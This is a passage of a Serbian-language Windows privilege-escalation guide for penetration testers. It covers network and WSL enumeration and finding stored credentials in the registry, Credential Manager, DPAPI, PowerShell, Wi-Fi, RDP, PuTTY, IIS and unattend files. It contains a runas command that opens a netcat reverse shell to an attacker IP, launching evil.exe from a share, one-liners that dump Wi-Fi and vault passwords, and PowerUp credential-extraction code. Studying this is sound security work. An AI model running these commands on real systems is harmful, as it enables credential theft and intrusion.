Za lokalni listener, povežite njegov PID sa vlasnikom procesa, putanjom izvršne datoteke i svim servisima ili zakazanim zadacima koji ga pokreću. Servis za daljinsko upravljanje može omogućiti pristup kao njegov desktop korisnik samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija pokrenuta pod nalogom sa višim privilegijama zaseban je cilj za proveru: listener i putanja binarne datoteke predstavljaju pasivne naznake, dok ruta do oštećenja memorije koja zahteva autentifikaciju traži analizu baš te binarne datoteke i ulaza do kog se može doći. Ako izgleda da izloženi port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što pripišete pozadinski servis; samo pravilo za prosleđivanje ne dokazuje da je odredište dostupno ili ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Pravila zaštitnog zida

[**Pogledajte ovu stranicu za komande povezane sa zaštitnim zidom**](../basic-cmd-for-pentesters.md#firewall) **(izlistavanje pravila, kreiranje pravila, isključivanje, isključivanje...)**

Više [komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarni fajl `bash.exe` može se pronaći i u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete osluškivati na bilo kom portu (prvi put kada upotrebite `nc.exe` za osluškivanje na portu, pojaviće se GUI upit da li `nc` treba da bude dozvoljen u firewall-u).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete pokušati sa `--default-user root`

Možete da istražite sistem datoteka `WSL` u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` unutar WSL-a sam po sebi ne daje administratorska prava u Windowsu. Ako trenutni Windows identitet može da čita sistem datoteka neke distribucije, pregledajte datoteke sa istorijom komandi ljuske (uključujući `/root/.bash_history`) da biste pronašli komande koje su možda zabeležile akreditive; eskalacija i dalje zahteva važeći nalog sa višim privilegijama i dozvoljen način autentifikacije. Raspored `LocalState\rootfs` koristi se u starijim WSL instalacijama; WSL 2 obično čuva distribuciju na virtuelnom disku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), pa prvo utvrdite o kojoj se distribuciji radi i gde se nalazi. Izbegavajte ispisivanje sadržaja istorije komandi tokom automatizovanog prikupljanja podataka.

## Windows akreditivi

### Winlogon akreditivi

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Tretirajte `DefaultUserName` i `DefaultDomainName` kao kontekst naloga, a ne kao akreditive. Vrednost koja nije prazna u `DefaultPassword` ili `AltDefaultPassword` predstavlja nalaz plaintext vrednosti u registru. Ako je `AutoAdminLogon=1`, ali plaintext lozinka nije čitljiva, to je samo trag: [Sysinternals Autologon može da sačuva lozinku kao LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a obična čitanja registra ne potvrđuju da li taj secret postoji ili može da se preuzme. Pre prijavljivanja izloženosti akreditiva, proverite prava pristupa i stvarnu konfiguraciju prijavljivanja.

### Menadžer akreditiva / Windows vault

Preuzeto sa [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva korisničke akreditive za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled može delovati kao da korisnici mogu da sačuvaju akreditive za sajtove kao što su Facebook, Twitter ili Gmail i da se pregledači automatski prijavljuju, ali to ne funkcioniše tako.

Windows Vault čuva akreditive koje Windows može da koristi za automatsko prijavljivanje korisnika, što znači da **svaka Windows aplikacija kojoj su potrebni akreditivi za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault, kao i da koristi navedene akreditive umesto da korisnici svaki put unose korisničko ime i lozinku.

Osim ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da ne mogu da koriste akreditive za dati resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa credential manager-om i zatraži akreditive za taj resurs** iz podrazumevanog vault-a za skladištenje.

Koristite `cmdkey` da biste izlistali sačuvane akreditive na mašini.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možete da koristite `runas` sa opcijom `/savecred` kako biste upotrebili sačuvane akreditive. Sledeći primer pokreće udaljenu izvršnu datoteku preko SMB deljenja.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` sa datim akreditivima.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Imajte na umu mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows UWP aplikacije, Microsoft Edge i moderni sistemski servisi čuvaju authentication tokene i lozinke u čistom tekstu unutar Universal Windows Platform (UWP) `PasswordVault` (dostupan i kao `Web Credentials` u `vaultcmd`). Ovo skladište je izolovano po sesijama i može se dešifrovati nativno, bez administratorskih prava ili prava `SeDebugPrivilege`.

Pokrenite ovu PowerShell komandu u aktivnoj sesiji korisnika da biste odmah izlistali i dešifrovali sva sačuvana korisnička imena i lozinke u čistom tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka, koji se pretežno koristi u operativnom sistemu Windows za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi tajnu korisnika ili sistema kako bi značajno doprinelo entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisnikovih tajni za prijavljivanje**. U slučajevima šifrovanja sistema, koristi tajne za autentifikaciju domena sistema.

Šifrovani korisnički RSA ključevi, uz korišćenje DPAPI-ja, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [bezbednosni identifikator](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji se nalazi zajedno sa glavnim ključem koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa se njegov sadržaj ne može izlistati pomoću komande `dir` u CMD-u, ali može putem PowerShell-a).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Datoteke sa akreditivima zaštićene glavnom lozinkom** obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` za dešifrovanje.\
Možete **izvući mnogo DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root pristup).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell akreditivi

**PowerShell akreditivi** se često koriste za **skriptovanje** i zadatke automatizacije kao praktičan način za čuvanje šifrovanih akreditiva. Akreditivi su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kom su kreirani.

Izvezeni akreditiv može imati proizvoljan naziv datoteke ili `.xml` putanju. Kada skripta ili inventar datoteka ukaže na jednu, utvrdite stvarnu putanju profila naloga umesto da pretpostavite `C:\Users`: [Windows može da smesti profile na drugo mesto](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Čitljiva datoteka je samo trag; [Windows `Export-Clixml` vezuje šifrovani akreditiv za korisnika i računar koji su ga izvezli](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a za svaki pronađeni nalog zasebno je potrebno da ima važeća prava na željenom servisu. Najpre proverite putanje i ACL-ove, bez ispisivanja šifrovanih ili običnih vrednosti tokom rutinskog popisivanja.

Da biste **dešifrovali** PS akreditive iz datoteke koja ih sadrži, možete da uradite sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Upravljač akreditivima za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite modul Mimikatz `dpapi::rdg` sa odgovarajućim `/masterkey` da biste **dešifrovali sve .rdg datoteke**\
Možete **izvući mnoge DPAPI masterkey ključeve** iz memorije pomoću modula Mimikatz `sekurlsa::dpapi`

**mRemoteNG koristi drugačije skladište veza.** Pregledajte čitljiv XML u `%APPDATA%\mRemoteNG` i korisničkim fasciklama Documents, uključujući datoteke sa uobičajenim imenima kao što je `config.xml`. Utvrdite šemu veza i šifrovane atribute `Password` pre nego što XML datoteku smatrate tragom koji vodi do kredencijala. Sačuvana vrednost nije DPAPI/RDCMan lozinka; oporavak zavisi od postavki šifrovanja datoteke i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti tokom široke enumeracije.

**Izvozi profila Remote Desktop Plus** mogu se nalaziti i u korisničkim fasciklama ili deljenoj fascikli za administraciju. Nasleđeni izvoz `profiles.xml` sadrži unose `Data/Profile` sa elementima `ProfileName`, `Password` i `Secure`. Neprazan element lozinke tretirajte kao trag koji vodi do kredencijala, ali ga nemojte ispisivati niti pretpostavljati da sadrži običan tekst: [dobavljač navodi](https://www.donkz.nl/) da zaštita profila može biti vezana za nalog i računar na kojima je profil kreiran ili konfigurisana sa blažim ograničenjima. Proverite poreklo datoteke i uslove oporavka pre nego što se oslonite na nju.

### Sticky Notes

Ljudi ponekad čuvaju lozinke i druge informacije u aplikacijama za lepljive beleške. Microsoftova upakovana aplikacija Sticky Notes obično čuva beleške na lokaciji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili druge aplikacije mogu koristiti druga skladišta u korisničkom profilu, uključujući LevelDB. Utvrdite koja je aplikacija instalirana i koji format skladišta koristi pre nego što zaključite da nema beleški na osnovu odsustva SQLite datoteke.

Ako Sticky Notes koristi SQLite zapisivanje unapred (WAL), sama kopija datoteke `plum.sqlite` možda neće sadržati nedavno potvrđene beleške. Sačuvajte odgovarajuću datoteku `plum.sqlite-wal` uz doslednu kopiju baze podataka i uključite `plum.sqlite-shm` ako je dostupna; indeks deljene memorije može ponovo da se izgradi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite dokumentaciju o WAL-u](https://www.sqlite.org/wal.html). Beleška koja sadrži ime naloga ili lozinku samo je trag koji vodi do kredencijala: zasebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Zapis iz šifrovanog upravljača lozinkama zahteva i stvarni ključ za dešifrovanje i tumačenje specifično za aplikaciju da bi mogao da potvrdi prijavu sa višim privilegijama.

### AppCmd.exe

**Imajte na umu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti ga sa nivoom visokog integriteta.**\
**AppCmd.exe** se nalazi u fascikli `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su konfigurisani neki **kredencijali** koje je moguće **oporaviti**.

Ovaj kod je preuzet iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instaleri se **pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (Informacije iz** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Fajlovi i Registry (kredencijali)

### Artefakti kredencijala u Registry ključevima alata za podršku

Neke starije instalacije za daljinsku podršku čuvaju nazive vrednosti povezane sa lozinkama u fiksnim ključevima aplikacije u Registry-ju. Na primer, `SecurityPasswordAES` u TeamViewer-u označavao je konfigurisanu statičku lozinku sesije u verzijama pre 9, prema [objašnjenju proizvođača o Registry ključu](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Oznaka u nazivu vrednosti samo je trag za proveru: pre procene kredencijala proverite instaliranu verziju, da li su podaci vrednosti čitljivi, njihov format i trenutno ponašanje pri autentifikaciji. Prelazak sa lozinke za daljinsku podršku na privilegovaniji Windows nalog zahteva i stvarnu ponovnu upotrebu lozinke, kao i ovlašćenje za taj nalog. Ne uključujte šifrat i oporavljene lozinke u uobičajeni izlaz enumeracije.

### Deljene tabele sa zaštićenim listovima

Ako se sumnja da čitljiva deljena radna sveska sadrži podatke o nalozima, razlikujte **šifrovanje fajla** od zaštite radnog lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita radnog lista kontroliše uređivanje i nije bezbednosna funkcija; ona sama po sebi ne dokazuje da je sadržaj radne sveske šifrovan. Pregledajte samo ovlašćene, relevantne fajlove i izbegavajte ispisivanje mogućih tajni tokom opšte enumeracije. Čitljiva putanja do `.xlsx` fajla, zaštićeni list ili skrivena kolona sami po sebi ne dokazuju da kredencijali postoje niti da bilo koji nalog ima viša prava; zasebno proverite stvarne podatke i trenutna prava naloga.

### Sačuvane zakrpe izmenâ na CI serveru

CI server može da sačuva poslate izmene izvornog koda u svom direktorijumu sa podacima i nakon završetka build-a. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` kao skladište izmena za remote-run; direktorijum sa podacima može da se konfiguriše i ne mora da bude unutar `ProgramData`. Čitljiva zakrpa može da sačuva uklonjene ili dodate reference na fajl sa kredencijalima, ključ za šifrovanje ili skriptu koja koristi oboje. Na primer, PowerShell tok rada `ConvertTo-SecureString -Key` zahteva AES ključ kao i šifrovani niz; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ prosleđuje zasebno. Najpre pregledajte samo dostupna imena zakrpa, a zatim, uz ovlašćenje, proverite relevantan sadržaj bez ispisivanja tajni u uobičajenom izlazu enumeracije. Putanja do zakrpe, šifrovana vrednost ili referenca na ključ sami po sebi ne dokazuju da su kredencijali važeći niti da omogućavaju pristup sa višim pravima. Ograničite ACL-ove direktorijuma sa podacima i izbegavajte commit-ovanje tajni u build izmene.

### Prilagođena rotacija lozinke lokalnog administratora

Domaći alat za rotaciju lozinki može da čuva šifrovanu lozinku lokalnog administratora u lokalnom servisu, dok su kredencijali za njegov datastore smešteni u čitljivom `.env` fajlu ili pored binarnog fajla za ažuriranje. Zajedno proverite zakazani zadatak alata za ažuriranje, nalog, ACL-ove konfiguracije, listener i dozvole za datastore. Datastore dostupan samo preko loopback-a i dalje je dostupan lokalnom korisniku koji ima važeće kredencijale, ali sama autentifikacija ne dokazuje da korisnik ima dozvolu da čita relevantne zapise. Ako su seed za šifrovanje ili ključni materijal dostupni pored šifrata, pre nego što se pouzdate u šifrovanje proverite tačan način izvođenja ključa. Šema koja deterministički izvodi AES ključ iz izloženog seed-a pomoću Go paketa [`math/rand`](https://pkg.go.dev/math/rand) nije pogodna za zaštitu te lozinke; Go navodi da taj paket nije primeren za slučajnost osetljivu na bezbednost. Pre nego što oporavljenu lozinku tretirate kao put za eskalaciju, potvrdite da je i dalje važeća i da pripada nalogu koji je član lokalne grupe Administrators. Zakazani zadatak, putanja do `.env` fajla ili šifrovani blob sami po sebi ne dokazuju nijedan od tih uslova. Ne uključujte lozinke i ključni materijal u uobičajeni izlaz enumeracije.

Za upravljanje lozinkama lokalnih administratora koristite [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Njegovo skladištenje u direktorijumu ili u Entra-i i kontrole pristupa razlikuju se od prilagođenog lokalnog datastore-a; [Elasticsearch uloge](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) takođe određuju da li autentifikovani korisnik datastore-a može da čita određeni indeks.

### Arhive dodataka Java servera i ponovna upotreba kredencijala

Neki dodaci za Java servere distribuiraju se kao JAR arhive u direktorijumu servera `plugins`. Čitljiv prilagođeni dodatak može da sadrži konfiguraciju ili bajtkod sa ugrađenim kredencijalom servisa. Arhivu pregledajte samo uz ovlašćenje i ne uključujte oporavljene tajne u uobičajeni izlaz enumeracije. Sama putanja do dodatka ne dokazuje da tajna postoji, a oporavljena lozinka servisa omogućava viša prava samo ako važi i za privilegovaniji nalog. Proverite relevantne ACL-ove fajlova i zamenite ponovo upotrebljene kredencijale jedinstvenim tajnama. Pogledajte [PaperMC-ov vodič za instalaciju dodataka](https://docs.papermc.io/paper/adding-plugins/) za strukturu direktorijuma i [Oracle-ovu dokumentaciju za JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) za sadržaj arhiva.

### Kredencijali ugrađene baze podataka Openfire-a

Openfire instalacija koja koristi ugrađenu bazu podataka može da čuva `openfire.script` u direktorijumu `Openfire\embedded-db`. Ako trenutni nalog može da ga čita, zajedno pregledajte zapise `OFUSER` i svojstvo `passwordKey`. Openfire-ova [dokumentacija o provajderu korisnika](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) navodi da lozinke mogu da se čuvaju kao običan tekst ili da budu šifrovane ključem koji se čuva u tom svojstvu. Oporavljena lozinka je relevantna za eskalaciju samo ako je i dalje važeća za privilegovaniji identitet; samo ime fajla ne dokazuje ni pristup za čitanje ni ponovnu upotrebu kredencijala. Putanja je smernica za inventarizaciju, zato ne uključujte sadržaj baze podataka i kredencijale u uobičajeni izlaz enumeracije.

Odvojeni fajl `Openfire\conf\openfire.xml` može da otkrije konfigurisane portove i bind interfejs administratorske konzole čak i kada se koristi spoljna baza podataka. Openfire obično vezuje administratorsku konzolu za loopback; to i dalje omogućava lokalnom nalogu da pristupi toj adresi ako listener radi. Zajedno proverite stvarni listener, ovlašćenu administratorsku ulogu, pravila za otpremanje dodataka i identitet Openfire servisa. Administrator koji može da instalira dodatak može da izazove izvršavanje koda dodatka u kontekstu servisa, što može imati visoke privilegije ako servis radi kao LocalSystem. Podudaranje lozinke naloga ili čitljiva putanja do konfiguracije sami po sebi ne dokazuju pristup administratorskoj konzoli niti izvršavanje koda. Pogledajte proizvođačev [vodič za instalaciju i upravljanje dodacima](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) i [svojstvo API-ja za otpremanje dodataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracija servera za forenzičko upravljanje

Konfiguracije Velociraptor servera, koje se obično zovu `server.config.yaml`, mogu da sadrže `CA.private_key` internog CA-ja. Ako korisnik sa nižim privilegijama može da čita taj ključ, možda može da izda API klijentski sertifikat. Da li to omogućava viša prava zavisi od korisničkih uloga servera, dostupnosti API-ja i identiteta pod kojim se izvršava server ili ciljni agent. Klijentska konfiguracija sadrži drugačiji materijal; njeno pronalaženje ne dokazuje pristup CA-ju servera. U nekim okruženjima se privatni ključ CA-ja čuva van mreže, pa čitljiva konfiguracija servera možda ne sadrži ključ za potpisivanje.

Na Windows serveru proverite ACL konfiguracije **servera** u njegovom instalacionom direktorijumu i svih zaštićenih rezervnih kopija. Jedna od mogućih lokacija je `%ProgramFiles%\VelociraptorServer\server.config.yaml`; ako se razlikuje, koristite putanju koju je konfigurisao servis. Potvrdite da trenutni identitet može da čita fajl i da je `CA.private_key` zaista prisutan. Ne ispisujte privatni ključ u logove niti u izlaz enumeracije. Proizvođačev tok rada `config api_client` koristi CA ključ za izdavanje klijentskog sertifikata, ali je potrebna i efektivna serverska uloga; njeno kreiranje ili menjanje može zahtevati upis u datastore ili ponovno pokretanje. Postojeći privilegovani identitet servera može da pruži put čak i kada takvi upisi nisu dostupni. API upiti sa pravima za izvršavanje rade u relevantnom kontekstu servera ili agenta, koji može imati visoke privilegije.

Zaštitite konfiguraciju servera i rezervne kopije restriktivnim ACL-ovima, po mogućstvu držite CA ključ za potpisivanje van mreže i ograničite API uloge i pristup listener-u. Pogledajte [Velociraptor API dokumentaciju](https://docs.velociraptor.app/docs/server_automation/server_api/) i [smernice za bezbednosnu konfiguraciju](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY kredencijali

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY je zaseban upravljač sesijama. Njegovo izvorno šifrovano skladište može biti na lokaciji `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok izvezena rezervna kopija sesija može imati naziv `sessions-backup.dat` i biti sačuvana na drugom mestu. [SolarWinds-ov vodič za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi šifrovani lozinkom i da mogu sadržati sesije, ključeve, skripte, oznake i njihove međusobne veze; na [forumu za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) navedena je putanja do izvornog skladišta. Najpre proverite dozvole nad datotekama i putanje. Pronalaženje bilo koje od ovih datoteka ne otkriva njenu lozinku niti dokazuje da su sačuvani akreditivi i dalje važeći ili da imaju veće privilegije.

### PuTTY SSH ključevi hostova

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani u ključu registra `HKCU\Software\OpenSSH\Agent\Keys`, pa proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete neku stavku unutar te putanje, verovatno je reč o sačuvanom SSH ključu. On je šifrovan, ali se može lako dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako usluga `ssh-agent` nije pokrenuta, a želite da se automatski pokreće pri podizanju sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da napravim SSH ključeve, dodam ih pomoću `ssh-add` i prijavim se na mašinu preko SSH-a. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije otkrio korišćenje `dpapi.dll` tokom autentifikacije asimetričnim ključem.

### Datoteke za automatizovanu instalaciju

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ove datoteke možete potražiti i pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM rezervne kopije

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
